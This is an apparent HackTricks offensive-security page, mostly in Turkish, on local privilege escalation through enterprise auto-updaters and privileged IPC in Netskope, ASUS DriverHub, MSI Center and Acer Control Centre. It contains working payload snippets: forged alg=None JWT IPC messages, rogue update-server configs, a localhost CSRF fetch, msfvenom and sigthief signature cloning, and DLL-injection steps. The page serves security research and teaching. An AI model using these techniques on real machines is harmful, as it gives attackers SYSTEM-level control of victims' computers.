# Kurumsal Auto-Updaters ve Ayrıcalıklı IPC'nin Kötüye Kullanımı (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, düşük engelli bir IPC yüzeyi ve ayrıcalıklı bir güncelleme akışı açığa çıkaran kurumsal endpoint ajanları ve updaters içinde bulunan Windows yerel ayrıcalık yükseltme zincirleri sınıfını genelleştirir. Temsilî bir örnek, düşük yetkili bir kullanıcının enrollment'ı saldırgan kontrolündeki bir sunucuya zorlayabildiği ve ardından SYSTEM servisi tarafından kurulan kötü amaçlı bir MSI teslim edebildiği Netskope Client for Windows < R129 (CVE-2025-0309) örneğidir.

Benzer ürünler için yeniden kullanabileceğiniz temel fikirler:
- Ayrıcalıklı bir servisin localhost IPC'sini yeniden kayıt veya yeniden yapılandırmayı saldırgan sunucuya zorlamak için kötüye kullanın.
- Satıcının güncelleme uç noktalarını uygulayın, sahte bir Trusted Root CA teslim edin ve updater'ı kötü amaçlı, "signed" bir pakete yönlendirin.
- Zayıf signer kontrollerini (CN allow‑list'leri), isteğe bağlı digest bayraklarını ve gevşek MSI özelliklerini atlatın.
- Eğer IPC "şifreliyse", anahtar/IV'yi kayıt defterinde depolanan, herkesin okuyabildiği makine kimliklerinden türetin.
- Eğer servis çağıranları image path/process name ile kısıtlıyorsa, allow‑list'li bir sürece inject edin veya birini suspended olarak oluşturup DLL'inizi minimal bir thread‑context yaması ile bootstrap yapın.

---
## 1) Localhost IPC aracılığıyla enrollment'ı saldırgan sunucuya zorlamak

Birçok ajan, JSON kullanarak localhost TCP üzerinden SYSTEM servisine bağlanan kullanıcı modunda bir UI süreci ile gelir.

Netskope'da gözlemlendi:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit akışı:
1) Backend host'u kontrol eden claim'lere (ör. AddonUrl) sahip bir JWT enrollment token'ı oluşturun. İmza gerekmemesi için alg=None kullanın.
2) JWT'niz ve tenant adı ile provisioning komutunu çağıran IPC mesajını gönderin:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis, enrollment/config için sahte sunucunuza istek göndermeye başlar, ör.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Eğer caller doğrulaması path/name\-based ise, isteği allow\-listed vendor binary'den başlatın (bkz. §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

İstemci sunucunuzla bağlantı kurduktan sonra, beklenen endpoint'leri uygulayın ve onu saldırgan MSI'ye yönlendirin. Tipik sıra:

1) /v2/config/org/clientconfig → Çok kısa bir updater interval ile JSON konfigürasyonu döndürün, ör.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Bir PEM CA certificate döndürür. Servis bunu Local Machine Trusted Root store'a yükler.
3) /v2/checkupdate → Zararlı bir MSI'yi ve sahte bir sürümü işaret eden metadata sağlar.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: the service may only check the Subject CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.
- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. No enforcement at install.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow\-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow\-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow\-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver\-enforced tamper rules.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user\-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed\-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in\-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already\-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES\-encrypted) IPC messages and includes the suspended\-process injection to originate from an allow\-listed binary.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user\-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker\-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state\-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Aşağıda gösterilen PowerShell CLI bile, Origin header spoofed to the trusted value olduğunda başarılı olur:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON gövdesinde tanımlanan rastgele yürütülebilir dosyaları indirir ve bunları `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`'de önbelleğe alır. İndirme URL doğrulaması aynı alt dize mantığını yeniden kullanır, bu yüzden `http://updates.asus.com.attacker.tld:8000/payload.exe` kabul edilir. İndirmeden sonra ADU.exe sadece PE'nin bir imza içerip içermediğini ve Subject dizesinin ASUS ile eşleşip eşleşmediğini kontrol eder – `WinVerifyTrust` yok, zincir doğrulama yok.

Süreci silahlandırmak için:
1) Bir payload oluşturun (ör. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS'un imzacısını ona klonlayın (ör. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe`'yi `.asus.com` taklidi bir domainde barındırın ve UpdateApp'i yukarıdaki tarayıcı CSRF'i ile tetikleyin.

Origin ve URL filtreleri alt dize bazlı olduğu ve signer kontrolü yalnızca dizeleri karşılaştırdığı için, DriverHub saldırgan ikili dosyasını yükseltilmiş bağlamında indirip çalıştırır.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’in SYSTEM servisi her çerçevenin `4-byte ComponentID || 8-byte CommandID || ASCII arguments` olduğu bir TCP protokolü sunar. Temel bileşen (Component ID `0f 27 00 00`) `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` ile gelir. Bunun işleyicisi:
1) Gelen yürütülebilir dosyayı `C:\Windows\Temp\MSI Center SDK.exe`'ye kopyalar.
2) İmzayı `CS_CommonAPI.EX_CA::Verify` ile doğrular (sertifika subject'ı “MICRO-STAR INTERNATIONAL CO., LTD.” olmalı ve `WinVerifyTrust` başarılı olmalı).
3) Geçici dosyayı SYSTEM olarak, saldırgan kontrollü argümanlarla çalıştıran bir scheduled task oluşturur.

Kopyalanan dosya doğrulama ile `ExecuteTask()` arasında kilitlenmez. Bir saldırgan şunları yapabilir:
- Geçerli MSI imzalı bir ikiliyi gösteren Frame A gönderir (imza kontrolünün geçmesini ve görevin kuyruğa alınmasını garanti eder).
- Doğrulama tamamlandıktan hemen sonra `MSI Center SDK.exe`'yi üzerine yazacak şekilde, kötü amaçlı bir payload'u işaret eden tekrar eden Frame B mesajları ile yarışır.

Zamanlayıcı tetiklendiğinde, orijinal dosyayı doğrulamış olmasına rağmen üzerine yazılan payload'ı SYSTEM altında çalıştırır. Güvenilir sömürü, TOCTOU penceresi kazanılana kadar CMD_AutoUpdateSDK'yı spamleyen iki goroutine/thread kullanır.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında saklanan bir Component ID alır. Bir çerçevenin ilk 4 byte'ı o bileşeni seçer ve saldırganların komutları rastgele modüllere yönlendirmesine izin verir.
- Plugin'ler kendi task runner'larını tanımlayabilir. `Support\API_Support.dll` `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`'ü açığa çıkarır ve doğrudan `API_Support.EX_Task::ExecuteTask()`'i **hiçbir imza doğrulaması olmadan** çağırır – herhangi bir yerel kullanıcı bunu `C:\Users\<user>\Desktop\payload.exe`'ye yönlendirip deterministik olarak SYSTEM yürütmesi elde edebilir.
- Wireshark ile loopback'i sniff'lemek veya .NET binary'lerini dnSpy'da enstrümente etmek Component ↔ command eşlemesini hızlıca ortaya çıkarır; özel Go/ Python istemcileri daha sonra frame'leri tekrar oynatabilir.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode`'ı açığa çıkarır ve discretionary ACL'si uzak istemcilere izin verir (örn. `\\TARGET\pipe\treadstone_service_LightMode`). Dosya yolu ile birlikte komut ID `7` gönderilmesi servisin süreç-çoğaltma rutinini tetikler.
- İstemci kütüphanesi argümanlarla birlikte sihirli bir terminatör byte'ı (113) serileştirir. Frida/`TsDotNetLib` ile dinamik enstrümantasyon (enstrümantasyon ipuçları için bkz. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) yerel işleyicinin bu değeri bir `SECURITY_IMPERSONATION_LEVEL` ve integrity SID'e eşlediğini ve ardından `CreateProcessAsUser`'ı çağırdığını gösterir.
- 113 (`0x71`)'i 114 (`0x72`) ile değiştirmek, tam SYSTEM token'ını koruyan ve yüksek integrity SID (`S-1-16-12288`) ayarlayan genel dala düşürür. Bu yüzden oluşturulan ikili, hem yerelde hem de makinalar arası olarak kısıtlamasız SYSTEM olarak çalışır.
- Bunu açığa çıkmış installer bayrağı (`Setup.exe -nocheck`) ile birleştirerek ACC'yi lab VM'lerde bile ayağa kaldırıp vendor donanımı olmadan pipe'ı test edebilirsiniz.

Bu IPC açıkları, localhost servislerinin karşılıklı kimlik doğrulamayı neden zorlaması gerektiğini (ALPC SIDs, `ImpersonationLevel=Impersonation` filtreleri, token filtreleme) ve her modülün “run arbitrary binary” yardımcısının neden aynı signer doğrulamalarını paylaşması gerektiğini vurgular.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
